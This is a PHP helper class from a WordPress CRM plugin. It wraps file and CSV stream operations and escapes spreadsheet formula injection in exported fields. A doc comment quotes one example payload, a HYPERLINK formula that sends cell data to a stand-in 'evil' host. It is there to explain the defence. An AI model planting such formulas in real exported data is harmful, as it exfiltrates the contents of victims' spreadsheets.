<?php

namespace BitApps\Crm\Helpers;

final class File
{
    public const READ = 'r';

    public const WRITE = 'w';

    public const APPEND = 'a';

    /**
     * Characters that make a spreadsheet treat a cell as a formula.
     */
    private const CSV_FORMULA_TRIGGERS = '=+-@';

    /**
     * Leading bytes spreadsheet parsers skip before looking for a trigger.
     */
    private const CSV_LEADING_NOISE = " \t\r\n\v\f\0";

    /**
     * Open a file stream for reading, writing, or appending.
     *
     * Primary use: CSV operations requiring stream-based processing.
     * Uses native PHP fopen
     *
     * @param string $path Absolute path to the file
     * @param string $mode File mode: self::READ, self::WRITE, or self::APPEND
     *
     * @return false|resource File stream resource or false on failure
     */
    public static function open(string $path, string $mode = self::READ)
    {
        return fopen($path, $mode); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fopen -- Using fopen for CSV streaming with fgetcsv
    }

    /**
     * Close an open file stream.
     *
     * @param resource $stream File stream resource from File::open()
     *
     * @return bool True on success, false on failure
     */
    public static function close($stream)
    {
        return fclose($stream); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fclose
    }

    /**
     * Write a CSV row to an open file stream.
     *
     * @param resource $stream    File stream opened in write/append mode
     * @param array    $fields    Array of field values to write
     * @param string   $separator Column separator (default: comma)
     * @param string   $enclosure Field enclosure character (default: double quote)
     * @param string   $escape    Escape character (default: backslash)
     * @param string   $eol       End-of-line character (default: newline)
     *
     * @return false|int Number of bytes written or false on failure
     */
    public static function writeCsv(
        $stream,
        array $fields,
        string $separator = ',',
        string $enclosure = '"',
        string $escape = '\\',
        string $eol = "\n"
    ) {
        return fputcsv($stream, array_map([self::class, 'escapeCsvFormula'], $fields), $separator, $enclosure, $escape, $eol);
    }

    /**
     * Neutralise spreadsheet formula injection in a single CSV field.
     *
     * Spreadsheet applications evaluate a cell as a formula when its first
     * meaningful character is =, +, - or @, so an attacker-supplied CRM value
     * such as =HYPERLINK("http://evil/?x="&A1,"click") executes on the machine
     * of whoever opens the export. Leading whitespace and control bytes are
     * skipped before that check because parsers ignore them too, so " =1+1"
     * is just as dangerous as "=1+1".
     *
     * Prefixing with a single quote forces the cell to be read as text; the
     * quote itself is not displayed. Plain integers and decimals are exempt so
     * negative numbers still import as numbers rather than text — note this is
     * deliberately narrower than is_numeric(), which also accepts scientific
     * notation and whitespace-padded values that could carry a payload.
     *
     * @param mixed $field Field value about to be written
     *
     * @return mixed Neutralised value, or the original when no escaping applies
     */
    public static function escapeCsvFormula($field)
    {
        if (!\is_string($field) && !\is_int($field) && !\is_float($field)) {
            return $field;
        }

        $value = (string) $field;

        if ($value === '' || self::isPlainNumber($value)) {
            return $field;
        }

        // Already neutralised (for example a re-exported imported value).
        if ($value[0] === "'") {
            return $field;
        }

        $meaningful = ltrim($value, self::CSV_LEADING_NOISE);

        if ($meaningful === '' || strpos(self::CSV_FORMULA_TRIGGERS, $meaningful[0]) === false) {
            return $field;
        }

        return "'" . $value;
    }

    /**
     * Read a CSV row from an open file stream.
     *
     * Returns array of field values or false when EOF/error.
     *
     * @param resource $stream    File stream opened in read mode
     * @param null|int $length    Max line length (0 = unlimited, recommended)
     * @param string   $separator Column separator (default: comma)
     * @param string   $enclosure Field enclosure character (default: double quote)
     * @param string   $escape    Escape character (default: backslash)
     *
     * @return array|false Array of field values or false on EOF/error
     */
    public static function readCsv(
        $stream,
        ?int $length = 0,
        string $separator = ',',
        string $enclosure = '"',
        string $escape = '\\'
    ) {
        return fgetcsv($stream, $length, $separator, $enclosure, $escape);
    }

    public static function isExist(string $path): bool
    {
        return WPFilesystem::exists($path);
    }

    public static function isReadable(string $path): bool
    {
        return WPFilesystem::is_readable($path);
    }

    public static function isWriteable(string $path): bool
    {
        return WPFilesystem::is_writable($path);
    }

    public static function isFile(string $path): bool
    {
        return WPFilesystem::is_file($path);
    }

    public static function isUploaded(string $fileName): bool
    {
        return is_uploaded_file($fileName);
    }

    /**
     * Move a file from source to destination using WP Filesystem API.
     *
     * Safely moves files respecting WordPress filesystem abstraction layer (FTP/SSH/Direct).
     * Commonly used for relocating uploaded files from temp to permanent storage.
     *
     * @param string $source      Absolute path to the source file
     * @param string $destination Absolute path to the destination
     * @param bool   $overwrite   Whether to overwrite if destination exists (default: false)
     *
     * @return bool True on success, false on failure
     */
    public static function move(string $source, string $destination, bool $overwrite = false): bool
    {
        return WPFilesystem::move($source, $destination, $overwrite);
    }

    public static function removeDirectory(string $path): bool
    {
        return WPFilesystem::rmdir($path);
    }

    /**
     * Whether a value is a plain integer or decimal, with no padding,
     * exponent, or other notation a spreadsheet trigger could hide behind.
     *
     * @param string $value
     *
     * @return bool
     */
    private static function isPlainNumber($value)
    {
        return preg_match('/^[+-]?(?:\d+|\d*\.\d+)$/', $value) === 1;
    }
}
